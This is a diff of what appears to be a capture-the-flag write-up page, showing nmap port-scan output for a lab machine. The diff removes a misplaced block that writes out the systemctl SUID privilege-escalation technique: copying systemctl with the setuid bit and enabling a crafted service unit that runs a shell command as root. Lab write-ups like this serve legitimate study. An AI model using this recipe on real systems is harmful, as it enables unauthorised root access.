@@ -5,15 +5,7 @@
 445/tcp  open  microsoft-ds
 3128/tcp open  squid-http
 3333/tcp open  dec-notes
-</code></pre></div><p>sudo sh -c &lsquo;cp $(which systemctl) .; chmod +s ./systemctl&rsquo;</p><p>TF=$(mktemp).service
-echo &lsquo;[Service]
-Type=oneshot
-ExecStart=/bin/sh -c &ldquo;id > /tmp/output&rdquo;
-[Install]
-WantedBy=multi-user.target&rsquo; > $TF
-./systemctl link $TF
-./systemctl enable &ndash;now $TF
-We find six ports open, we can now make a more in depth scan with <code>nmap -sC -sV $IP</code>. It will found the service type and version.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>PORT     STATE SERVICE     VERSION
+</code></pre></div><p>We find six ports open, we can now make a more in depth scan with <code>nmap -sC -sV $IP</code>. It will found the service type and version.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 3.0.3
 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
